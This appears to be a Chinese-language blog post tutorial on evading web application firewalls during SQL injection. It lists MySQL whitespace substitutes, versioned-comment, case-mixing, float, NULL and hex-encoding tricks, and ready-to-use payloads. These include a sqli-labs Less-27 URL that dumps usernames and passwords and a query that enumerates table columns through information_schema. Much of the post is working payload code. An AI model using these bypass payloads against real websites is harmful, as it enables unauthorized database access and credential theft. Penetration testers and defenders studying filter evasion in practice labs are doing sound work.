---
layout: post
title: SQL注入绕过
categories: 网络安全
description: SQL注入绕过
keywords: SQL注入绕过
---

SQL注入绕过技术

### 1、SQL注入绕过

SQL 注入绕过技术 已经是一个老生常谈的内容了，防注入可以使用某些云 waf加速乐等安全产品，这些产品会自带 waf 属性拦截和抵御 SQL 注入，也有一些产品会在服务器里安装软件，例如 iis 安全狗、d 盾、还有就是在程序里对输入参数进行过滤和拦截 例如 360webscan 脚本等只要参数传入的时候就会进行检测，检测到有危害语句就会拦截。SQL 注入绕过的技术也有许多。但是在日渐成熟的 waf 产品面前，因为 waf 产品的规则越来越完善，所以防御就会越来越高，
安全系统也跟着提高，对渗透测试而言，测试的难度就越来越高了。

### 2、空格字符绕过

在网站的url中有汉字复制出来的时候会有一些`%+xxx`的编码，这些都是防止乱码进行的编码，各种符合也都有各自的编码

在一个url中空格字符`%20`可以替换的有很多种，如下:

```txt
%09 TAB 键（水平）
%0a 新建一行
%0c 新的一页
%0d return 功能
%0b TAB 键（垂直）
%a0 空格
```

这些编码到MySQL里面都是可以当空格用的，甚至一些注释也可以当成空格

```mysql
 /**/   select * from users/*aaaaaaa*/where/*aaaaa*/id=1;
 /*!*/  select * from users/*!50009*/where/*!50009*/id=1;
 
 select * from users where id=1 /*!union*//*!select*/1,2,3,4;
```

可以将空格字符替换成注释` /**/ `，还可以使用` /*!*/`

这里的根据 mysql 版本的内容不注释，比如：

```sql
select * from users /*!50009*//*!where*/id=1;
```

这条语句就可以正常使用，where虽然被注释了，但是是可以运行的。所以`/*!*/`是可以被当成空格用的。ps：在其他数据库中不行，但是在MySQL中可以。这是MySQL为了兼容导致的一个问题，不同版本也有不同的情况，有的版本是50009，有的版本是40001。

### 3、大小写绕过

将 字符串设置为大小写，例如 and 1=1 转成 AND 1=1AnD 1=1，一些的正则写的不严谨，就可以绕过，反正SQL是不区分大小写的。

```sql
select * from users where id=1 UNION SELECT 1,2,3,4;
select * from users where id=1 UniON SelECT 1,2,3,4;
```

一些特殊符号被过滤，可以结合上面的符号替换

```txt
Less-27/?id=9999999' union select 1,(select group_concat(username,password)from users),3 and '1

# 把上面的攻击语句经过符号和大小写替换，成为下面的内容，成功绕过

Less-27/?id=9999999%27%09UniOn%09SeLeCt%091,(SelEct%09group_concat(username,password)from%09users),3%09and%20%271
```

### 4、浮点数绕过

一些匹配机制是校验整型或者字符型的，这个时候使用浮点型就可以绕过了。

```sql
select * from users where id=8E0union select 1,2,3,4;
select * from users where id=8.0union select 1,2,3,4;

# 构建的语句
# sql.php?name=\N'union select user(),\Nfrom users--+
```

这俩效果是一样的

### 5、NULL值绕过

`select \N;`：代表NULL

```sql
select * from users where id=\Nunion select 1,2,3,\N;
select * from users where id=\Nunion select 1,2,3,\Nfrom users;

# 构建的语句
# sql.php?name=\N'union select user(),\Nfrom users--+
```

这俩效果一样

### 6、双引号绕过

如果 waf 拦截过滤单引号的时候，可以使用双引号 在 mysql 里也可以用双引号作为字符串

```sql
select * from users where id='1';
select * from users where id="1";
```

也可以将字符串转换成 16 进制 再进行查询。

```sql
select hex('admin'); # 转换为16进制
select * from users where username='admin';
select * from users where username=0x61646D696E;
```

如果 gpc 开启了，但是注入点是整形 也可以用 hex 十六进制进行绕过

```sql
select * from users where id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where TABLE_NAME='users' limit 1),4;

select * from users where id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where TABLE_NAME=0x7573657273 limit 1),4;
```
